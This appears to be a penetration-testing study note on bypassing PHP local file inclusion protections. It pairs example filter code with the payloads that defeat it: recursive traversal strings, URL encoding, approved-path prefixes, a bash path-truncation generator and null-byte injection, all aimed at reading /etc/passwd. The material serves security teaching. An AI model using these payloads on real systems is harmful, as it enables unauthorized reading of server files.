### Overview

- Web applications may apply _basic LFI protections_, such as:
    - Path traversal filters
    - Input sanitization
    - Appending extensions
    - Path whitelisting
- These protections can often be bypassed using simple tricks unless properly implemented.

---
## Non-Recursive Path Traversal Filters

### Filter Example
```php
$language = str_replace('../', '', $_GET['language']);
```

### Bypass Technique
- Use recursive payloads:
    - `....//` → resolves to `../`
    - `..././` or `....\/` also work
    - `....////etc/passwd` bypasses filter and reads the file
- The filter only runs once and does not reprocess its output.

---
## Encoding

### Scenario

- Filters block `.` and `/` characters
### Bypass Technique

- URL encode traversal: `../` → `%2e%2e%2f`
- Use **Burp Decoder** or online tools for encoding
- Double encoding may bypass stricter filters

---
## Approved Paths

### Filter Example
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```
### Bypass Technique

- Start payload with allowed path: `./languages/`
- Use path traversal afterward:
    - `./languages/../../../../etc/passwd`
- Combine with encoding or recursive payloads for added evasion

---
## Appended Extension

### Scenario
- Application appends `.php` to all inputs

### Implication
- Can only include files ending in `.php`

### Notes
- Still useful for source code reading if `.php` exists
- Bypass possible with older PHP versions using truncation or null bytes


---
## Path Truncation (Legacy)

### Behavior (Pre-PHP 5.3/5.4)

- PHP string max length = 4096 characters
- Anything beyond gets truncated
- Trailing slashes and `.` are ignored

### Bypass Technique

- Create a long path >4096 characters to truncate `.php`
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

---
## Null Byte Injection (Legacy)

### Behavior (Pre-PHP 5.5)

- `%00` (null byte) ends string, anything after ignored
### Bypass Technique

- Payload: `/etc/passwd%00`
- If `.php` is appended: `/etc/passwd%00.php` → becomes `/etc/passwd`
